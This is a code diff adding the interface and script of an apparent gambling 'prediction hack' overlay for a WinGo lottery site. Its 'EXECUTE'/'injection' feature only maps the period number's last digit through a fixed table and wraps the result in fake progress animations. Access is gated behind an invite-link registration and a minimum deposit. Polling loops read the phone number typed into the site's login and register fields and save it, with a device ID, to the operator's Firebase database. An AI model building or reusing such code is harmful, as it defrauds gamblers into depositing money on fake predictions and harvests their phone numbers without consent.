+@keyframes warnPop { 0% { transform: scale(0.82); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
+.warn-icon {
+  width: 54px; height: 54px; margin: 0 auto 12px;
+  border-radius: 50%; display: grid; place-items: center;
+  background: radial-gradient(circle, rgba(192,38,255,0.32), rgba(8,5,13,0.95));
+  border: 2px solid #C026FF;
+  box-shadow: 0 0 20px rgba(192,38,255,0.6), inset 0 0 12px rgba(192,38,255,0.3);
+  color: #F05BFF;
+  animation: warnIconPulse 2s ease-in-out infinite;
+}
+@keyframes warnIconPulse {
+  0%,100% { box-shadow: 0 0 20px rgba(192,38,255,0.6), inset 0 0 12px rgba(192,38,255,0.3); }
+  50% { box-shadow: 0 0 32px rgba(240,91,255,0.9), inset 0 0 18px rgba(240,91,255,0.5); }
+}
+.warn-badge {
+  display: inline-block;
+  font-family: 'Share Tech Mono', monospace; font-size: 8px; font-weight: 700;
+  letter-spacing: 2px; color: #F05BFF; padding: 2px 8px;
+  border: 1px solid #C026FF; border-radius: 3px; margin-bottom: 10px;
+  background: rgba(0,0,0,0.5); box-shadow: 0 0 8px rgba(192,38,255,0.5);
+}
+.warn-title {
+  font-family: 'Orbitron', sans-serif; font-weight: 900; font-size: 18px;
+  letter-spacing: 1.2px; color: #fff;
+  text-shadow: 0 0 14px #C026FF, 0 0 24px #F05BFF;
+  margin-bottom: 6px;
+}
+.warn-msg {
+  font-family: 'Orbitron', sans-serif; font-weight: 800; font-size: 11px;
+  letter-spacing: 1.5px; color: #F05BFF;
+  text-shadow: 0 0 10px rgba(240,91,255,0.9); margin-bottom: 10px;
+}
+.warn-detail {
+  font-family: 'Inter', sans-serif; font-size: 9.5px; font-weight: 600;
+  line-height: 1.5; color: rgba(255,255,255,0.75);
+  margin-bottom: 16px; letter-spacing: 0.2px;
+}
+.warn-btn {
+  width: 100%; height: 40px;
+  border: 1.5px solid #F05BFF; border-radius: 8px;
+  background: linear-gradient(90deg, #180A24 0%, #7900FF 30%, #C026FF 50%, #7900FF 70%, #180A24 100%);
+  background-size: 250% 100%;
+  animation: flowBtnGrad 3s linear infinite;
+  color: #fff; font-family: 'Orbitron', sans-serif; font-weight: 900;
+  font-size: 12px; letter-spacing: 1.5px;
+  text-shadow: 0 0 10px rgba(240,91,255,0.9);
+  cursor: pointer;
+  box-shadow: 0 0 16px rgba(192,38,255,0.6), inset 0 1px 2px rgba(255,255,255,0.35);
+  clip-path: polygon(8px 0, calc(100% - 8px) 0, 100% 50%, calc(100% - 8px) 100%, 8px 100%, 0 50%);
+  transition: transform 0.15s ease;
+}
+.warn-btn:active { transform: scale(0.96); }
+</style>
+
+<style>
+#fab-core, #fab-core * {
+  pointer-events: none !important;
+}
+#mini {
+  pointer-events: auto !important;
+  cursor: pointer;
+  touch-action: none !important;
+  display: flex;
+  align-items: center !important;
+  justify-content: center !important;
+}
+#stage {
+  pointer-events: auto !important;
+}
+button, .stage-btnrow, .stage-btnrow button, #spd-hide, #spd-start, #btnRegister, #btnDeposit {
+  pointer-events: auto !important;
+  cursor: pointer;
+  touch-action: manipulation !important;
+}
+</style>
+
+</head>
+<body>
+
+<!-- Game iframe -->
+<iframe id="target-game-frame" src="about:blank" allow="autoplay"></iframe>
+
+<!-- Full-screen block overlay -->
+<div id="warnOverlay" role="alertdialog">
+  <div class="warn-card">
+    <div class="warn-icon">
+      <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+        <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+      </svg>
+    </div>
+    <div class="warn-badge">AUTH · CHECK</div>
+    <div class="warn-title">ACCESS LOCKED</div>
+    <div class="warn-msg">REGISTER TO CONTINUE</div>
+    <div class="warn-detail">Your account is not registered on our Firebase network. Please register first to unlock VIP access.</div>
+    <button class="warn-btn" id="warnRegBtn" type="button">REGISTER NOW</button>
+  </div>
+</div>
+
+<!-- Mini FAB -->
+<div id="mini" role="button" aria-label="Open {name}">
+  <div id="fab-core">
+    <div id="fab-icon">
+      <img id="fab-img" src="logo.png">
+    </div>
+    <div id="fab-dot"></div>
+  </div>
+</div>
+
+<!-- Main panel -->
+<div id="stage">
+  <svg class="border-svg" viewBox="0 0 180 220" preserveAspectRatio="none">
+    <rect class="stream-base" x="1.5" y="1.5" width="177" height="217" rx="13" ry="13" />
+    <rect class="stream-1" x="1.5" y="1.5" width="177" height="217" rx="13" ry="13" pathLength="1000" />
+    <rect class="stream-2" x="1.5" y="1.5" width="177" height="217" rx="13" ry="13" pathLength="1000" />
+    <rect class="stream-3" x="1.5" y="1.5" width="177" height="217" rx="13" ry="13" pathLength="1000" />
+  </svg>
+
+  <div class="stage-wrapper" id="stageWrapper">
+    <div class="panel-grid"></div>
+    <div class="hex-tex"></div>
+    <canvas class="rain-canvas" id="rainCanvas" width="180" height="220"></canvas>
+
+    <!-- Shared header -->
+    <div class="stage-header">
+      <div class="title-group">
+        <span class="sub-title">{name}</span>
+      </div>
+    </div>
+
+    <!-- VIEW 1: AUTH -->
+    <div class="panel-view" id="view-auth">
+      <div class="view-body">
+        <div class="lock-icon-wrap">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+          </svg>
+        </div>
+        <div class="view-title">ACCESS LOCKED</div>
+        <div class="view-sub">REGISTER FIRST</div>
+      </div>
+      <div class="stage-btnrow">
+        <button class="btn-single" id="btnRegister">REGISTER</button>
+        <button class="btn-hide-sm" id="btnHideAuth" aria-label="Close">✕</button>
+      </div>
+    </div>
+
+    <!-- VIEW 2: LOCKED (low balance) -->
+    <div class="panel-view" id="view-locked">
+      <div class="view-body">
+        <div class="lock-icon-wrap">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+          </svg>
+        </div>
+        <div class="view-title">LOW BALANCE</div>
+        <div class="view-sub" id="lockSub">MIN DEPOSIT ₹{deposit}</div>
+      </div>
+      <div class="stage-btnrow">
+        <button class="btn-single" id="btnDeposit">DEPOSIT NOW</button>
+        <button class="btn-hide-sm" id="btnHideLocked" aria-label="Close">✕</button>
+      </div>
+    </div>
+
+    <!-- VIEW 3: MAIN -->
+    <div class="panel-view" id="view-main">
+      <div class="mid-row">
+        <div class="coin-side" id="coinSide">
+          <div class="supernova-flash" id="supernovaFlash"></div>
+          <div class="emp-shockwave" id="empShockwave"></div>
+          <div class="emp-shockwave secondary" id="empShockwave2"></div>
+          <div class="spark-container" id="sparkContainer"></div>
+          <div class="ring ring-dots"></div>
+          <div class="ring ring-ticks"></div>
+          <div class="orbital-ring" id="orbitalRing">
+            <div class="cross-dot top"></div>
+            <div class="cross-dot bottom"></div>
+            <div class="cross-dot left"></div>
+            <div class="cross-dot right"></div>
+          </div>
+          <div class="coin" id="coinBall">
+            <div class="coin-placeholder" id="coinPlaceholder">READY</div>
+            <img id="coinImg" class="coin-img" src="" alt="number" style="display:none;"
+                 onerror="this.style.display='none'; document.getElementById('coinNum').style.display='block';">
+            <span class="coin-num" id="coinNum" style="display:none;"></span>
+          </div>
+        </div>
+
+        <div class="status-side">
+          <div class="signal-row">
+            <div class="sig-led"></div>
+            <span id="sigText">READY</span>
+          </div>
+          <div class="size-btn" id="sizeBtn">
+            <span id="sizeVal">--</span>
+          </div>
+          <div class="sync-row">
+            <span class="sync-label">SYNC</span>
+            <div class="sync-track">
+              <i class="sync-fill" id="syncFill" style="width: 0%;"></i>
+              <span class="sync-dot dot-25" id="syncDot25"></span>
+              <span class="sync-dot dot-50" id="syncDot50"></span>
+              <span class="sync-dot dot-75" id="syncDot75"></span>
+              <span class="sync-dot dot-100" id="syncDot100"></span>
+            </div>
+            <span class="sync-pct" id="syncPct">0%</span>
+          </div>
+          <div class="mode-row">
+            <span>MODE : <b>APEX</b></span>
+            <span>CORE : <b>OK</b></span>
+          </div>
+        </div>
+      </div>
+
+      <div class="period-bar">
+        <div class="ping-badge">PING <span id="pingVal">22MS</span></div>
+        <div class="period-text">PERIOD : <span id="periodNum">----</span></div>
+      </div>
+
+      <div class="stage-btnrow">
+        <button id="spd-start">EXECUTE</button>
+        <button id="spd-hide">HIDE</button>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
+<script>
+"use strict";
+
+var opened = false;
+var userRegistered = true;
+
+/* ══════════════════════════════════════════════════════════════════
+   CONFIG
+══════════════════════════════════════════════════════════════════ */
+var APP_ID = "{appid}";
+var fbDepositCondition = true;
+var fbMinDeposit = {deposit};
+var fbRegCondition = true;
+
+var REGISTER_URL = "{domain}{invitecode}";
+var DEPOSIT_URL  = "{domain}wallet/Recharge";
+var WINGO_URL    = "{domain}saasLottery/WinGo?gameCode=WinGo_30S&lottery=WinGo";
+
+/* ══════════════════════════════════════════════════════════════════
+   DOM REFS
+══════════════════════════════════════════════════════════════════ */
+var gameFrame = document.getElementById("target-game-frame");
+var mini = document.getElementById("mini");
+var stage = document.getElementById("stage");
+var stageWrapper = document.getElementById("stageWrapper");
+var coinSide = document.getElementById("coinSide");
+var supernovaFlash = document.getElementById("supernovaFlash");
+var empShockwave = document.getElementById("empShockwave");
+var empShockwave2 = document.getElementById("empShockwave2");
+var sparkContainer = document.getElementById("sparkContainer");
+var startBtn = document.getElementById("spd-start");
+var sizeVal = document.getElementById("sizeVal");
+var sizeBtn = document.getElementById("sizeBtn");
+var periodNum = document.getElementById("periodNum");
+var syncFill = document.getElementById("syncFill");
+var syncPct = document.getElementById("syncPct");
+var syncDot25 = document.getElementById("syncDot25");
+var syncDot50 = document.getElementById("syncDot50");
+var syncDot75 = document.getElementById("syncDot75");
+var syncDot100 = document.getElementById("syncDot100");
+var sigText = document.getElementById("sigText");
+var coinNum = document.getElementById("coinNum");
+var pingVal = document.getElementById("pingVal");
+var coinBall = document.getElementById("coinBall");
+var coinImg = document.getElementById("coinImg");
+var coinPlaceholder = document.getElementById("coinPlaceholder");
+var lockSub = document.getElementById("lockSub");
+var warnOverlay = document.getElementById("warnOverlay");
+
+/* ══════════════════════════════════════════════════════════════════
+   FIREBASE INIT
+══════════════════════════════════════════════════════════════════ */
+var rtdb = null;
+try {
+  firebase.initializeApp({
+    apiKey: "AIzaSyAenqA_6oCB3YrIiWryg1qz1PTUvwiEeJU",
+    authDomain: "user-data-one.firebaseapp.com",
+    databaseURL: "https://user-data-one-default-rtdb.asia-southeast1.firebasedatabase.app",
+    projectId: "user-data-one",
+    storageBucket: "user-data-one.firebasestorage.app",
+    messagingSenderId: "734551610621",
+    appId: "1:734551610621:web:e40f751a58a3cf12529a94",
+    measurementId: "G-N4R47VEST0"
+  });
+  rtdb = firebase.database();
+} catch (e) { console.warn("Firebase init failed:", e); }
+
+/* ══════════════════════════════════════════════════════════════════
+   ZAYRO BRIDGE
+══════════════════════════════════════════════════════════════════ */
+if (typeof window.ZAYRO === 'undefined') window.ZAYRO = {
+  speak: function(t){ try{ if(!window.speechSynthesis) return; window.speechSynthesis.cancel(); var u = new SpeechSynthesisUtterance(t); u.lang='en-US'; u.rate=.90; u.pitch=1.0; window.speechSynthesis.speak(u);}catch(e){} },
+  playSound: function(f){ try{ new Audio(f).play(); }catch(e){} },
+  stopSound: function(){},
+  openUrl: function(u){ if (gameFrame) gameFrame.src = u; },
+  navigate: function(u){ if (gameFrame) gameFrame.src = u; }
+};
+if (typeof window.ZAYROUI === 'undefined') window.ZAYROUI = { setArea: function(){} };
+
+function navTo(url){
+  try {
+    if (window.ZAYRO && typeof window.ZAYRO.openUrl === 'function') window.ZAYRO.openUrl(url);
+    else if (window.ZAYRO && typeof window.ZAYRO.navigate === 'function') window.ZAYRO.navigate(url);
+    else gameFrame.src = url;
+  } catch(e) { gameFrame.src = url; }
+}
+
+/* ══════════════════════════════════════════════════════════════════
+   HELPERS
+══════════════════════════════════════════════════════════════════ */
+function attachBtnHandler(id, handler){
+  var el = document.getElementById(id);
+  if (!el) return;
+  var isHandling = false;
+  var execute = function(e){
+    if (e) { try { e.preventDefault(); e.stopPropagation(); } catch(err){} }
+    if (isHandling) return;
+    isHandling = true;
+    handler();
+    setTimeout(function(){ isHandling = false; }, 400);
+  };
+  el.addEventListener('click', execute);
+  el.addEventListener('touchend', function(e){
+    if (e.cancelable) { try { e.preventDefault(); } catch(err){} }
+    execute(e);
+  }, {passive: false});
+}
+
+function formatCurrentDate(d){
+  var pad = function(n){ return (n<10?'0':'')+n; };
+  return d.getFullYear()+'-'+pad(d.getMonth()+1)+'-'+pad(d.getDate())+' '+pad(d.getHours())+':'+pad(d.getMinutes())+':'+pad(d.getSeconds());
+}
+
+function getAndroidDeviceId(){
+  try {
+    if (window.ZAYRO && typeof window.ZAYRO.getDeviceId === 'function') {
+      var did = window.ZAYRO.getDeviceId();
+      if (did && did !== 'unknown') return did;
+    }
+  } catch(e){}
+  var stored = localStorage.getItem('slex_device_id');
+  if (!stored) {
+    stored = 'dev_' + Math.random().toString(36).substring(2,12) + Date.now();
+    localStorage.setItem('slex_device_id', stored);
+  }
+  return stored;
+}
+
+function saveRegisteredUserToFirebase(phone){
+  if (!rtdb || !phone) return;
+  var now = new Date();
+  var userData = {
+    phone: phone.toString(),
+    timestamp: now.getTime(),
+    date: formatCurrentDate(now),
+    app_id: APP_ID,
+    device_id: getAndroidDeviceId(),
+    status: "registered"
+  };
+  var path = "apps/" + APP_ID + "/registered_users/phones/" + phone.toString();
+  rtdb.ref(path).update(userData).catch(function(err){ console.warn("User save failed:", err); });
+}
+
+/* ══════════════════════════════════════════════════════════════════
+   STATE MACHINE + AUTH
+══════════════════════════════════════════════════════════════════ */
+var curState = 'wait';
+var lastPageState = 'wait';
+var currentPhone = null;
+var warnActive = false;
+var isOnRegisterPage = false;
+var isOnWingoPage = false;
+var wasAuthFlowActive = false;
+var pendingRegPhone = null;
+var _cwPending = false;
+var bypassRunning = false;
+var isWorking = false;
+var wingoHackDone = false;
+var lastBalance = -1;
+var everMetMin = false;
+var lastPeriod = null;
+var predData = null;
+var lockedPeriod = null;
+var lockedPrediction = null;
+var _lowBalancePlayed = false;
+var _successPlayed = false;
+
+var LOGIC = {
+  0:{n:'5',s:'BIG'},   1:{n:'2',s:'SMALL'}, 2:{n:'4',s:'SMALL'},
+  3:{n:'7',s:'BIG'},   4:{n:'8',s:'BIG'},   5:{n:'9',s:'BIG'},
+  6:{n:'0',s:'SMALL'}, 7:{n:'3',s:'SMALL'}, 8:{n:'6',s:'BIG'},
+  9:{n:'1',s:'SMALL'}
+};
+
+/* ══════════════════════════════════════════════════════════════════
+   FIREBASE CHECK
+══════════════════════════════════════════════════════════════════ */
+function checkAndWarn(phone){
+  if (!rtdb) { hideWarnOverlay(); return; }
+  if (!fbRegCondition) { hideWarnOverlay(); return; }
+  if (_cwPending) return;
+  _cwPending = true;
+  var path = "apps/" + APP_ID + "/registered_users/phones/" + phone.toString();
+  rtdb.ref(path).once("value")
+    .then(function(snap){
+      _cwPending = false;
+      if (!snap.exists()) showWarnOverlay();
+      else hideWarnOverlay();
+    })
+    .catch(function(){
+      _cwPending = false;
+      showWarnOverlay();
+    });
+}
+
+window.setPhone = function(phone){
+  if (!phone) return;
+  var p = phone.toString().trim().replace(/[^0-9]/g,'');
+  if (p.length === 12 && p.startsWith('91')) p = p.substring(2);
+  if (p.length < 10) return;
+  if (isOnRegisterPage) { pendingRegPhone = p; return; }
+  if (p !== currentPhone || !warnActive) {
+    currentPhone = p;
+    checkAndWarn(p);
+  }
+};
+
+/* ══════════════════════════════════════════════════════════════════
+   LOGIN / REGISTER MONITORS
+══════════════════════════════════════════════════════════════════ */
+var _lMon = null;
+function startLoginMon(){
+  if (_lMon) return;
+  if (currentPhone && fbRegCondition) checkAndWarn(currentPhone);
+  _lMon = setInterval(function(){
+    try {
+      var fDoc = gameFrame.contentDocument || gameFrame.contentWindow.document;
+      if (!fDoc) return;
+      var inp = fDoc.querySelector('.phoneInput__container-input input');
+      if (!inp) {
+        var all = fDoc.querySelectorAll('input');
+        for (var i=0; i<all.length; i++){
+          var pl=(all[i].placeholder||'').toLowerCase(), nm=(all[i].name||'').toLowerCase();
+          if (pl.indexOf('phone')>=0 || pl.indexOf('mobile')>=0 || nm.indexOf('phone')>=0 || nm.indexOf('user')>=0) { inp = all[i]; break; }
+        }
+      }
+      if (inp) {
+        var v = inp.value.replace(/[^0-9+]/g,'');
+        if (v.length === 12 && v.startsWith('91')) v = v.substring(2);
+        if (v.length >= 10 && v !== currentPhone) {
+          currentPhone = v;
+          if (fbRegCondition) checkAndWarn(v);
+        }
+      }
+    } catch(e){}
+  }, 150);
+}
+function stopLoginMon(){ if (_lMon){ clearInterval(_lMon); _lMon = null; } }
+
+var _rMon = null;
+function startRegisterMon(){
+  if (_rMon) return;
+  _rMon = setInterval(function(){
+    try {
+      var fDoc = gameFrame.contentWindow.document || gameFrame.contentDocument;
+      if (!fDoc) return;
+      var all = fDoc.querySelectorAll('input'), inp = null;
+      for (var i=0; i<all.length; i++){
+        var pl=(all[i].placeholder||'').toLowerCase(), nm=(all[i].name||'').toLowerCase();
+        if (pl.indexOf('phone')>=0 || pl.indexOf('mobile')>=0 || nm.indexOf('phone')>=0 || nm.indexOf('user')>=0) { inp = all[i]; break; }
+      }
+      if (inp) {
+        var v = inp.value.replace(/[^0-9]/g,'');
+        if (v.length === 12 && v.startsWith('91')) v = v.substring(2);
+        if (v.length >= 10) pendingRegPhone = v;
+      }
+    } catch(e){}
+  }, 1000);
+}
+function stopRegisterMon(){ if (_rMon){ clearInterval(_rMon); _rMon = null; } }
+
+/* ══════════════════════════════════════════════════════════════════
+   WARN OVERLAY
+══════════════════════════════════════════════════════════════════ */
+function showWarnOverlay(){
+  var _f = !warnActive;
+  warnActive = true;
+  warnOverlay.classList.add('show');
+  try { window.ZAYROUI.setArea(0,0,1,1); } catch(e){}
+  if (_f) playAudio('bypass.mp3');
+}
+function hideWarnOverlay(){
+  warnActive = false;
+  warnOverlay.classList.remove('show');
+  try { window.ZAYROUI.setArea(0,0,0,0); } catch(e){}
+}
+
+/* ══════════════════════════════════════════════════════════════════
+   BALANCE
+══════════════════════════════════════════════════════════════════ */
+window.setBalance = function(bal){
+  lastBalance = parseFloat(bal) || 0;
+  if (!fbDepositCondition) {
+    everMetMin = true;
+    if (curState === 'low') goState(lastPageState !== 'wait' ? lastPageState : 'home');
+    else updateUI();
+    return;
+  }
+  if (lastBalance < 10) {
+    everMetMin = false;
+    if (curState === 'low' || curState === 'wingo' || curState === 'home' || curState === 'wait') goState('low');
+  } else if (lastBalance >= fbMinDeposit) {
+    everMetMin = true;
+    if (curState === 'low') goState(lastPageState !== 'wait' ? lastPageState : 'home');
+  } else {
+    if (everMetMin) {
+      if (curState === 'low') goState(lastPageState !== 'wait' ? lastPageState : 'home');
+    } else {
+      if (curState !== 'wingo' && curState !== 'low') goState('low');
+    }
+  }
+  updateUI();
+};
+
+/* ══════════════════════════════════════════════════════════════════
+   URL ROUTER
+══════════════════════════════════════════════════════════════════ */
+window.setUrl = function(url){
+  var u = (url||'').toLowerCase();
+  var prevIsReg = isOnRegisterPage;
+  isOnRegisterPage = u.indexOf('register')>=0 || u.indexOf('invitationcode')>=0 || u.indexOf('invitecode')>=0;
+  var isLogin = u.indexOf('login')>=0 && !isOnRegisterPage;
+
+  if (prevIsReg && !isOnRegisterPage && !isLogin && pendingRegPhone) {
+    saveRegisteredUserToFirebase(pendingRegPhone);
+    currentPhone = pendingRegPhone;
+    pendingRegPhone = null;
+  }
+  if (isOnRegisterPage) {
+    wasAuthFlowActive = true;
+    hideWarnOverlay();
+    stopLoginMon();
+    startRegisterMon();
+    return;
+  } else {
+    stopRegisterMon();
+    if (!isLogin && pendingRegPhone) {
+      saveRegisteredUserToFirebase(pendingRegPhone);
+      currentPhone = pendingRegPhone;
+      pendingRegPhone = null;
+    }
+  }
+
+  if (isLogin) {
+    wasAuthFlowActive = true;
+    hideWarnOverlay();
+    startLoginMon();
+  } else {
+    stopLoginMon();
+  }
+
+  isOnWingoPage = u.indexOf('saas')>=0 || u.indexOf('wingo')>=0 || u.indexOf('lottery')>=0;
+
+  if (isOnWingoPage) {
+    if (!bypassRunning) {
+      if (lastPageState !== 'wingo') {
+        wingoHackDone = false;
+        lockedPrediction = null;
+        lockedPeriod = null;
+      }
+      goState('wingo');
+    } else {
+      lastPageState = 'wingo';
+    }
+  } else if (isLogin) {
+    goState('wait');
+  } else {
+    var _wasAuth = wasAuthFlowActive;
+    wasAuthFlowActive = false;
+    goState('home');
+    if (_wasAuth && !_successPlayed) {
+      _successPlayed = true;
+      playAudio('successful.mp3');
+    }
+  }
+};
+
+/* ══════════════════════════════════════════════════════════════════
+   STATE → VIEW MAPPING
+══════════════════════════════════════════════════════════════════ */
+var ALL_VIEWS = ['view-auth', 'view-locked', 'view-main'];
+function showView(id){
+  ALL_VIEWS.forEach(function(v){
+    var el = document.getElementById(v);
+    if (el) el.classList.toggle('active', v === id);
+  });
+}
+
+function goState(n){
+  stopAudio();
+  curState = n;
+  if (n === 'wait') { _lowBalancePlayed = false; _successPlayed = false; }
+  if (n === 'low') {
+    if (!_lowBalancePlayed) {
+      _lowBalancePlayed = true;
+      setTimeout(function(){ if (curState === 'low') playAudioForce('lowbalance.mp3'); }, 120);
+    }
+  }
+  updateUI();
+}
+
+function updateUI(){
+  if (curState === 'wait') {
+    showView('view-auth');
+  } else if (curState === 'low') {
+    showView('view-locked');
+    if (lockSub) lockSub.textContent = 'MIN DEPOSIT ₹' + fbMinDeposit;
+  } else if (curState === 'home') {
+    showView('view-main');
+    updateMainButton();
+    resetMainViewIfNeeded();
+  } else if (curState === 'wingo') {
+    showView('view-main');
+    updateMainButton();
+  }
+}
+
+function updateMainButton(){
+  if (isWorking) return;
+  if (!isOnWingoPage) {
+    startBtn.innerText = 'DEPOSIT';
+    startBtn.disabled = false;
+    startBtn.onclick = function(){ navTo(DEPOSIT_URL); };
+  } else if (wingoHackDone) {
+    startBtn.innerText = 'RE-EXECUTE';
+    startBtn.disabled = false;
+    startBtn.onclick = runInjection;
+  } else {
+    startBtn.innerText = 'EXECUTE';
+    startBtn.disabled = false;
+    startBtn.onclick = runInjection;
+  }
+}
+
+function resetMainViewIfNeeded(){
+  if (!wingoHackDone) return;
+  wingoHackDone = false;
+  lockedPrediction = null;
+  lockedPeriod = null;
+  resetSync();
+  if (coinPlaceholder) coinPlaceholder.style.display = 'flex';
+  if (coinImg) { coinImg.style.display = 'none'; coinImg.src = ''; }
+  if (coinNum) { coinNum.style.display = 'none'; coinNum.innerText = ''; }
+  if (sizeVal) sizeVal.innerText = '--';
+  if (sizeBtn) sizeBtn.classList.remove('is-small','is-big','size-punch');
+  if (sigText) sigText.innerText = 'READY';
+}
+
+/* ══════════════════════════════════════════════════════════════════
+   PERIOD FETCHER
+══════════════════════════════════════════════════════════════════ */
+async function fetchPeriod(){
+  try {
+    var res = await fetch("https://api.bdg88zf.com/api/webapi/GetGameIssue", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        typeId: 1, language: 0,
+        random: "40079dcba93a48769c6ee9d4d4fae23f",
+        signature: "D12108C4F57C549D82B23A91E0FA20AE",
+        timestamp: 1727792520
+      })
+    });
+    var j = await res.json();
+    if (j && j.code === 0 && j.data && j.data.issueNumber) {
+      var cur = j.data.issueNumber.toString();
+      if (cur !== lastPeriod) {
+        lastPeriod = cur;
+        var lg = LOGIC[parseInt(cur.slice(-1))];
+        if (lg) predData = lg;
+        if (periodNum) periodNum.innerText = cur.slice(-4);
+      }
+    }
+  } catch(e) {}
+}
+
+/* ══════════════════════════════════════════════════════════════════
+   BALL IMAGES
+══════════════════════════════════════════════════════════════════ */
+var onlineNumImgs = [
+  'https://i.ibb.co/WvTR3Jrx/num0.png', 'https://i.ibb.co/yFQwGPZv/num1.png',
+  'https://i.ibb.co/XZNjXwjq/num2.png', 'https://i.ibb.co/233fFQqz/num3.png',
+  'https://i.ibb.co/mVsBYfQR/num4.png', 'https://i.ibb.co/Dg5kjr9L/num5.png',
+  'https://i.ibb.co/Z1HMQSPM/num6.png', 'https://i.ibb.co/0y8yYzDH/num7.png',
+  'https://i.ibb.co/dsRvZmSf/num8.png', 'https://i.ibb.co/prMV31Ng/num9.png'
+];
+onlineNumImgs.forEach(function(src){ var i = new Image(); i.src = src; });
+
+function setBallNumber(num){
+  var n = parseInt(num, 10);
+  if (!isNaN(n) && n >= 0 && n <= 9) {
+    if (coinPlaceholder) coinPlaceholder.style.display = 'none';
+    if (coinImg) { coinImg.src = onlineNumImgs[n]; coinImg.style.display = 'block'; }
+    if (coinNum) { coinNum.innerText = n; coinNum.style.display = 'none'; }
+    updateSizeByNumber(n);
+  }
+}
+
+function updateSizeByNumber(num){
+  var n = parseInt(num, 10);
+  var isSmall = !isNaN(n) && n >= 0 && n <= 4;
+  if (sizeVal) sizeVal.innerText = isSmall ? 'SMALL' : 'BIG';
+  if (sizeBtn) {
+    sizeBtn.classList.toggle('is-small', isSmall);
+    sizeBtn.classList.toggle('is-big', !isSmall);
+  }
+}
+
+/* ══════════════════════════════════════════════════════════════════
+   SYNC PROGRESS
+══════════════════════════════════════════════════════════════════ */
+var currentSyncPct = 0;
+var syncAnimTimer = null;
+var syncStepTimers = [];
+
+function clearAllSyncTimers(){
+  if (syncAnimTimer) clearInterval(syncAnimTimer);
+  syncAnimTimer = null;
+  syncStepTimers.forEach(function(t){ clearTimeout(t); });
+  syncStepTimers = [];
+}
+function resetSync(){
+  clearAllSyncTimers();
+  currentSyncPct = 0;
+  if (syncFill) syncFill.style.width = '0%';
+  if (syncPct) syncPct.innerText = '0%';
+  [syncDot25, syncDot50, syncDot75, syncDot100].forEach(function(d){ if (d) d.classList.remove('active'); });
+}
+function animateSyncTo(targetPct, duration){
+  duration = duration || 280;
+  if (syncAnimTimer) clearInterval(syncAnimTimer);
+  if (syncFill) syncFill.style.width = targetPct + '%';
+  var startPct = currentSyncPct;
+  var startTime = performance.now();
+  syncAnimTimer = setInterval(function(){
+    var now = performance.now();
+    var progress = Math.min(1, (now - startTime) / duration);
+    var current = Math.round(startPct + (targetPct - startPct) * progress);
+    if (syncPct) syncPct.innerText = current + '%';
+    if (syncDot25) syncDot25.classList.toggle('active', current >= 25);
+    if (syncDot50) syncDot50.classList.toggle('active', current >= 50);
+    if (syncDot75) syncDot75.classList.toggle('active', current >= 75);
+    if (syncDot100) syncDot100.classList.toggle('active', current >= 100);
+    if (progress >= 1) {
+      clearInterval(syncAnimTimer); syncAnimTimer = null;
+      currentSyncPct = targetPct;
+      if (syncPct) syncPct.innerText = targetPct + '%';
+    }
+  }, 20);
+}
+
+/* ══════════════════════════════════════════════════════════════════
+   AUDIO
+══════════════════════════════════════════════════════════════════ */
+var _af = '', _at = 0;
+function stopAudio(){ try { window.ZAYRO.stopSound(); } catch(e){} _af = ''; _at = 0; }
+function playAudio(f){
+  var n = Date.now();
+  if (f === _af && n - _at < 3000) return;
+  _af = f; _at = n;
+  try { window.ZAYRO.playSound(f); } catch(e){
+    try { var a = new Audio(f); a.volume = 1; var p = a.play(); if (p && p.catch) p.catch(function(){}); } catch(ee){}
+  }
+}
+function playAudioForce(f){ _af = ''; _at = 0; playAudio(f); }
+
+/* ══════════════════════════════════════════════════════════════════
+   RUN INJECTION
+══════════════════════════════════════════════════════════════════ */
+var rouletteTimer = null;
+
+function runInjection(){
+  if (isWorking) return;
+  if (!isOnWingoPage) { navTo(DEPOSIT_URL); return; }
+  if (curState !== 'wingo') return;
+
+  isWorking = true;
+  if (sigText) sigText.innerText = '🎲 SPINNING...';
+  coinSide.classList.add('khatarnak-scan');
+  if (stageWrapper) stageWrapper.classList.add('chassis-overdrive');
+  if (stage) stage.classList.add('stage-overdrive');
+  startBtn.disabled = true;
+  startBtn.innerText = '🎲 SPINNING...';
+
+  if (coinPlaceholder) coinPlaceholder.style.display = 'none';
+  if (coinImg) coinImg.style.display = 'block';
+  if (coinNum) coinNum.style.display = 'none';
+  if (rouletteTimer) clearInterval(rouletteTimer);
+  rouletteTimer = setInterval(function(){
+    var rNum = Math.floor(Math.random() * 10);
+    if (coinImg) coinImg.src = onlineNumImgs[rNum];
+    if (coinNum) coinNum.innerText = rNum;
+  }, 85);
+
+  resetSync();
+  syncStepTimers.push(setTimeout(function(){ animateSyncTo(25, 280); }, 100));
+  syncStepTimers.push(setTimeout(function(){ animateSyncTo(50, 280); }, 650));
+  syncStepTimers.push(setTimeout(function(){ animateSyncTo(75, 280); }, 1200));
+  syncStepTimers.push(setTimeout(function(){ animateSyncTo(100, 280); }, 1750));
+
+  var pred;
+  if (lockedPeriod && lockedPeriod === lastPeriod && lockedPrediction) {
+    pred = lockedPrediction;
+  } else if (predData) {
+    pred = predData;
+    lockedPeriod = lastPeriod;
+    lockedPrediction = pred;
+  } else {
+    pred = LOGIC[Math.floor(Math.random() * 10)];
+    lockedPrediction = pred;
+  }
+
+  syncStepTimers.push(setTimeout(function(){
+    showResult({
+      num: parseInt(pred.n, 10),
+      bs: pred.s,
+      period: lastPeriod ? lastPeriod.slice(-4) : '----'
+    });
+  }, 2300));
+}
+
